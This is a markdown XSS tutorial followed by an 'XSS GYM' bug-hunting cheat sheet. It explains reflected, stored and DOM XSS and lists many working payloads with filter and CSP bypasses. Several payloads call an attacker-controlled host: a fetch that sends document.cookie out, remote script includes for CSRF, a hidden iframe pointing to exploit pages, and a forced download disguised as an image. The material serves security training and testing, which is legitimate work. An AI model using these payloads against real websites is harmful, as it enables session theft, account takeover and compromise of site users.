# XSS 101
## 1. What is XSS?

![xss-popup](https://github.com/GTekSD/SUASS/assets/55411358/3df669f0-6c57-4933-9c6f-fffdb76bb9f3)

Fig. 1 – A classic XSS popup.

Cross-site scripting (XSS) is both the name of the most common vulnerability in web applications and the exploitation method performed against it. XSS attacks abuse the dynamic way websites interact with their clients, the browsers. It makes possible, for an attacker, to control the victim’s browser and his/her interaction with a given vulnerable website. To display back content provided or controlled by an user, like an URL parameter or an input field, a flawed application opens the door to manipulation of this content. This manipulation, generically called injection, is the XSS attack.

Browsers display content using a mix of HTML (basically a text formatting language) and a programming language called JavaScript. Among other things, JavaScript is responsible for making things run in response to events in the context of an application. Another window opening when a page loads, the drag and drop of elements of the page and any changes made to the it on the fly (without the need to reload it), for example, are things done by JavaScript.

JavaScript code comes between the HTML tags, <script> and </script> (the opening and closing ones, respectively) or in the form of an external include by means of the “src” (source) attribute of this same tag. In this way, libraries (reusable pieces of code) can be added to the current page and executed by browser in that context.

So when an attacker is able to inject this pair of tags into a page, any JavaScript code can be executed if there’s no filter in place (which is usually the vast majority of cases). Because anything an user in a browser can do also can be done by JavaScript, an attacker has total control over it.

JavaScript can also appears in common HTML elements, the regular tags. By means of event handlers inside them, like “onload” (when an page element is loaded by browser) or “onmouseover” (when a mouse pointer hovers over something), JavaScript code can also be executed. It increases considerably the numbers of vectors for an XSS attack.

### Types of XSS

Cross-site scripting can occur in the context of an application or not. Out of the context of an application is very rare but more dangerous and it will not be covered here. Focusing on the application, XSS can be caused by server side code (code sent by web server) or client side code (code processed by browser from code sent by web server).

Code sent by web server is the source code. It is processed by browser, with the help of the JavaScript engine, to create the elements of the document in a programmatic manner. This is called DOM (Document Object Model) and it’s generated as soon as the source code arrives.

So we have source-based and DOM-based types of XSS in a context of an application. Both have the following execution types.

Source-based:    |     Reflected      |      Stored

DOM-based:       |     Reflected      |      Stored

When the website or application just reflects back content maliciously manipulated by user (usually in the URL), we have a reflected XSS attack. This reflection, as we saw, affects the way browsers display the page and how they process things and behave. Take the following PHP code:
```
    $username = $_GET[‘user’];

    echo “<h1>Hello, ” . $username . “!</h1>”;
```

Which would display the user name taken from URL like
```
    http://mydomain.com/hello.php?user=John
```

In source code, it would be:
```
    <h1>Hello, John!</h1>
```
![netsparker-post-1](https://github.com/GTekSD/SUASS/assets/55411358/41c3323b-7eb2-4b65-b042-77418d9ee67d)
Fig. 2 – Example of parameter value reflection.

So, if an attacker use the URL “http://mydomain.com/hello.php?user=<script>alert(1)</script>” he/she will be able to make the browser generate the following source code:
```
    <h1>Hello, <script>alert(1)</script>!</h1>
```
Triggering the classic javascript alert box.

![netsparker-post-2](https://github.com/GTekSD/SUASS/assets/55411358/4c4044b8-27b7-4157-8e1e-c7f04a968a80)
Fig. 3 – The XSS being triggered.

When the website or application stores user input in a database or a file to display it later, like a field in a profile or a comment in a forum, the resulting attack is called persistent or stored XSS. Every user that sees this stored content is a potential victim.

While in this last attack, an user just needs to open or navigate to an infected page to be attacked, in the reflected one an user usually must click on attacker’s link, which contains what we call vector or payload, the code used for the XSS attack. Although seeming less dangerous than stored version, a reflected XSS can also be invisibly embedded into any other website and executes from another browser tab or window in the context of the target application.

### XSS Basic Examples

Usually, for a proof of concept (PoC) of an XSS attack exploring source-based flaws, security testers use one the following code.

#### 1. With <script> tag
```
    <script>alert(1)</script>
```
or
```
    <script src=//HOST/SCRIPT></script>
```

With HOST being a domain or IP address controlled by tester and SCRIPT being a script with alert(1) as content, like in:
```
    <script src=//brutelogic.com.br/1.js></script>
```

#### 2. With regular HTML tags
There are two types:

**a. Event-based**
```
    <TAG EVENT=alert(1)>
```

With TAG being any HTML or XML tag and EVENT being a supported event handler like:
```
    <body onload=alert(1)>
```
```
    <img src=1 onerror=alert(1)>
```
```    
    <svg onload=alert(1)>
```
```    
    <x onmouseover=alert(1)>
```

**b. Resource-based**
```
    <TAG RESOURCE=javascript:alert(1)>
```

With TAG being a proper HTML tag that supports a RESOURCE like:
```
    <iframe src=javascript:alert(1)>
```
```
    <object data=javascript:alert(1)>
```

All these make a window pop-up appears with the number one inside. Although useful to show the execution of JavaScript and then the possibility of hooking the browser for control, it’s better to prove that execution in the context of the application. For this, `alert(1)` is changed to `alert(document.domain)`.
      
Example:
```
    <script>alert(document.domain)</script>
```
These are just to prove the vulnerability; for attacks in the wild, a victim of an XSS attack usually will not be able to see anything while his/her browser will perform the attacker’s desired actions.

## 2. What Can be Done With XSS?

These are the main actions that can be performed by an attacker when exploiting an XSS flaw.

### 1. Cross-Site Request Forgery (CSRF)

JavaScript execution in a target domain makes possible for an attacker to capture an anti-CSRF token or nonce. That is the main defense for an application against a Cross-Site Request Forgery (CSRF) attack and the ability to steal that token allows an attacker to perform any action in behalf of victim.

If a victim is an administrator of a Content Management System (CMS) like the open-source WordPress, it’s possible to completely takeover the website like demonstrated here.  As long as the attacker knows how to perform actions that victim can do by means of HTTP requests, it’s possible to change victim’s recovery email if there’s no password protection leading to account takeover.

#### Attack Example:
```
    <script src=//brutelogic.com.br/MYSCRIPT.js></script>
```
Where MYSCRIPT.js is a remote script with JavaScript code to perform all HTTP requests needed to achieve desired victim’s action in application.

### 2. Steal an user session on the vulnerable website (including admins)

Browsers use a small text file to store locally important data about a given website. This file contains what we call cookies, pairs of variable and value that have some meaning for the application that sent them to browser. Cookies are used to identify a person after he logged into an application, so server has no need to ask for credentials again every time an user request a resource. While cookies are valid (they expire after a certain time), an user session is active in the application. If these valid cookies are stolen, the thief can impersonate that user and interact with application in the same way the real user does, without even knowing his password.

This gives access to all personal data stored about an user, like his telephone number, home address and even his/her credit card details in an e-commerce website, for example. For website administrators (admins), an XSS attack can lead to takeover of his/her website and even the machine where it is hosted.

#### Attack Example:
```
    <svg onload=fetch('//HOST/?cookie='+document.cookie)>
```
Where HOST is a domain or IP address controlled by attacker.

### 3. Capture the keys pressed by the user

By being able to capture what an user types in form fields, like the ones for login (username and password), an attacker can also compromise an user account in a given website.

### 4. Deface the page, serving any type of content

Users can be tricked into thinking that visited website was hacked or it’s not functional, which can lead to panic or the impossibility to perform actions in the application like buying an item.

#### Attack Example:
```
    <svg onload="document.body.innerHTML='<img src=//HOST/IMAGE>'">
```
Where HOST is a domain or IP address controlled by attacker and IMAGE is a full screen image with a “Hacked by” message, for example.

### 5. Trick the user into giving his/her credentials by means of a fake HTML form

With the ability to serve any content, an attacker can convince an user to enter or reenter his/her credentials in the application, but this time sending them to an attacker.

### 6. Crash the browser (local denial of service)

Very rare use, but possible. An attacker may want to keep away a certain rival in an auction, for example, by making his/her browser unresponsive.

### 7. Force download of files

It’s straightforward to make user’s browser download any file with XSS, but not necessarily executing it, which would give access to user machine. Unfortunately, due to the fact that an attacker has control over several other aspects of the trusted website, seems not so difficult to also trick the user into open it.

#### Attack Example:
```
    <a href=//HOST/FILE download=FILENAME>Download</a>
```
Where HOST is a domain or IP address controlled by attacker, FILE is the file attacker want the victim to download and FILENAME is the name of the file in victim’s machine (user can be forced to download an executable file while saving it as an image, for example).

### 8. Redirect user’s browser to another website where his/her machine can be compromised by memory exploits

Again, with the aim to takeover the user machine, an attacker can redirect the browser invisibly to another web address where another prepared application will try to break the browser barrier to access the user operating system (which would lead to compromise). If user has an outdated or vulnerable browser, attacker has great chances of success.

#### Attack Example:
```
    <iframe src=//HOST/ style=display:none></iframe>
```
Where  is a domain or IP address controlled by attacker.



-----------------------------------------------------------



# XSS GYM

## XSS (Cross-Site Scripting) – Hunting & Payloads Cheat Sheet

**Types of XSS**

1. **Reflected XSS** (Server-Side)
2. **Stored XSS** (Blind XSS) (Server-Side)
3. **DOM XSS** (Client-Side)

**Payload collections**  
- [XSS Payloadbox](https://github.com/payloadbox/xss-payload-list)  
- [Payloads All The Things – XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)

## 1. Reflected XSS – Hunting Methodology

### Steps to Hunt Reflected XSS

1. **Mapping / Crawling the Application**
   - Add target into Burp scope
   - Use advanced scope control if needed (wildcards):
     ```
     .*\.facebook\.com$
     .*\.test\.com$
     .*\.test\.*$
     (^|^[^:]+:\/\/|[^\.]+\.)zscaler.*
     ```
   - Target → Scope → Use advanced scope control → Add
   - Site map → Show only in-scope items

2. **Pick the parameters**
   - Target → Site map → Contents
   - Sort by parameters (look for ✔️ in GET/POST)
   - **GET** example:
     ```
     /test/demo_form.php?name1=value1&name2=value2
     ```
   - **POST** example:
     ```
     POST /test/demo_form.php HTTP/1.1
     Host: target.com

     name1=value1&name2=value2
     ```

3. **Check Reflection**
   - Send each interesting parameter to Repeater
   - Change value → look in response if it reflects (raw + rendered)

4. **Create payload**
   - Basic HTML injection test:
     ```html
     <u>underlined</u>
     <h1>Big heading</h1>
     ```
   - Classic JavaScript payload:
     ```html
     <script>alert(1)</script>
     ```
   - Common image-based:
     ```html
     <img src=x onerror=confirm(1)>
     <svg onload=confirm(1)>
     </title><img src=3dx onerror=confirm(1)>
     ```

### Impact Examples

- **Cookie Stealing**
  ```html
  <script>alert(document.cookie)</script>
  ```
  → `login=test%2Ftest` → decode → `test/test` → use in Cookie Editor

- **Phishing**  
  Inject fake login form that mimics the real one

## 2. Stored / Blind XSS

Typical locations:  
- Contact Us forms (email, fname, lname, message)  
- Comments, profiles, support tickets, etc.

**Recommended blind XSS platform**  
→ [xsshunter.com](https://xsshunter.com)  
Paste payload → wait for admin/viewer to trigger → check Fires tab

### XSS Gym / Training Exercises – Summary Table

| #   | Exercise Title                                      | Injection Context                          | Example Working Payload(s)                                                                                     |
|-----|------------------------------------------------------|--------------------------------------------|----------------------------------------------------------------------------------------------------------------|
| 01  | Injection in Title Tag                               | Inside `<title>`                           | `</title><script>alert(1)</script><u>asdf`                                                                     |
| 02  | —                                                    | After `</noscript>`                        | `</noscript><script>alert(1)</script>asdf`                                                                     |
| 03  | —                                                    | After `</style>`                           | `</style><script>alert(1)</script>asdf`                                                                        |
| 04  | Filtered Injection Inside Event Handler              | `onload="doSomething('…')"`                | `asdf%26%23x27%3b-alert(1)-%26%23x27%3b`                                                                       |
| 05  | —                                                    | After `</h1>`                              | `</h1><script>alert(1)</script>asdf`                                                                           |
| 06  | Injection in Attribute Value – Double Quote          | `value="…"`                                | `"><script>alert(1)</script>`                                                                                  |
| 07  | — (single quote)                                     | `value='…'`                                | `'><script>alert(1)</script>`                                                                                  |
| 08  | Filtered Injection in Attribute Value – Double Quote | Can't break out with `"`                   | `"+onmouseover="alert(1)`<br>`"+autofocus+onfocus="alert(1)`<br>`+onmouseover='alert(1)//`                     |
| 09  | — (single quote variants)                            | `value='…'`                                | `'+onmouseover='alert(1)`<br>`'+autofocus+onfocus='alert(1)//`                                                 |
| 10  | Injection in Textarea Tag                            | Inside `<textarea>`                        | `</textarea><script>alert(1)</script>`                                                                         |
| 11  | Injection in Script Tag – Single Quote Delimiter     | Inside `<script>`                          | `</script><img src=x onerror=confirm(1)>`<br>`</script><img src=x onerror=confirm`1`>` (backticks)             |
| 12  | — (cookie exfil)                                     | —                                          | `</script><img src=x onerror=confirm(document.cookie)>`                                                        |
| 13  | Injection in JavaScript Variable – Single Quote      | `var p = 'asdf';`                          | `';alert(1);//`<br>`'-alert(1)-'`<br>`'-alert(1)//`                                                            |
| 14  | — (double quote)                                     | `var p = "asdf";`                          | `"-alert(1)-"`                                                                                                 |
| 15  | Filtered – Single Quote                              | `var p = 'asdf';`                          | `\'-alert(1)-//`                                                                                               |
| 16  | — (double quote)                                     | —                                          | `\"alert(1)//`                                                                                                 |
| 17  | — (svg)                                              | —                                          | `</script><svg onload=prompt(1)>`                                                                              |
| 18  | — (backticks)                                        | `var p = `asdf`;`                          | `` `-alert(1)-` ``                                                                                             |
| 19  | — (escaped backtick)                                 | —                                          | `\`;alert(1)//`                                                                                                |
| 20  | Filtered – Backticks Delimiter                       | `var p = `asdf`;`                          | `${alert(1)}`                                                                                                  |
| 21  | Validated Injection in HTTP Referer                  | Regex validated referrer                   | `javascript://%0aalert(1)?whatever`<br>or double encode: `javascript://%250aalert(1)?whatever`                 |
| 22  | Injection in Iframe Tag                              | Inside `<iframe>`                          | `"></iframe><img src=x onerror=confirm(1)>`                                                                    |
| 23  | Injection in HTTP Header (CRLF)                      | Header injection                           | `%0d%0aXSS:+1`<br>`%0d%0aContent-Type:+text/html`<br>`<script>alert(1)</script>%0d%0aContent-Type:+text/html` |
| 24  | Filtered Double Injection in JS Variable             | `'` gets encoded                           | `-alert(1)//asdf\`                                                                                             |
| 28  | Injection in HTML Comments                           | `<!-- asdf -->`                            | `--><script>alert(1)</script>`                                                                                 |
| 29  | Filtered Injection in HTML Comments                  | `<!-- STRING -->`                          | `--><script>alert(1)</script>-->`                                                                              |
| 30  | Filtered Injection in JS DOM – Document Sink         | `element.innerHTML`                        | Encode payload (octal / URL) → `\74\151\155\147 ...`                                                           |
| 31  | Injection in Script Tag With Header                  | Custom header before Accept                | `xss</script><script>alert(1)</script>`                                                                        |
| 32  | Injection in URL (path)                              | Manipulate path                            | `/asdf"><script>alert(1)</script>`                                                                             |
| 33  | Bypassing CSP                                        | `script-src 'nonce-…'`                     | `</h1><base href="//x55.is">`                                                                                  |

## 3. DOM-based XSS

**Quick indicators**  
- Value does **not** appear in source code  
- Appears only after JavaScript execution  
- Use **DOM Invader** (Burp Suite extension)

### DOM Sink Types – Summary

| #   | Sink Type             | Typical Location / Sink              | Example Payload(s)                              |
|-----|-----------------------|--------------------------------------|-------------------------------------------------|
| 25  | Document Sink         | `element.innerHTML`, `document.write` | `<img src=x onerror=alert(1)>`                 |
| 26  | Location Sink         | `location =`, `location.href =`      | `javascript:alert(1)`                           |
| 27  | Execution Sink        | `eval()`, `setTimeout()`, `Function()` | `';alert(1)//` or direct in parameter           |
| 30  | Filtered Document Sink| `innerHTML` again                    | Octal encoded: `\74\151\155\147 ...`            |

## 4. More XSS Bypass & Filtering Tips

| Situation                                      | Technique / Payload Example                                                                 |
|------------------------------------------------|---------------------------------------------------------------------------------------------|
| `<script>` filtered                            | `<scr<script>ipt>alert(1)</scr</script>ipt>`                                               |
| Case-sensitive filter on `script`              | `<ScRIpT>alert(1)</sCrIPT>`                                                                |
| `alert`, `confirm`, `prompt` blocked           | `print()` / `alert``1`` / confirm`1``                                                      |
| `()` blacklisted                               | `alert`1``<br>`print`1``                                                                   |
| String concatenation blocked                   | `eval('ale'+'rt')(1)`                                                                      |
| `eval` + `atob` allowed                        | `<script>eval(atob("J2FsZXJ0KDEp"))</script>`                                              |
| Heavy filtering / everything blocked           | Use **JSFuck** encoder → `<script>[encoded jsfuck here]</script>`                          |

Good luck hunting! 🦊

Feel free to open issues / PRs if you want to add more exercises or modern payloads.
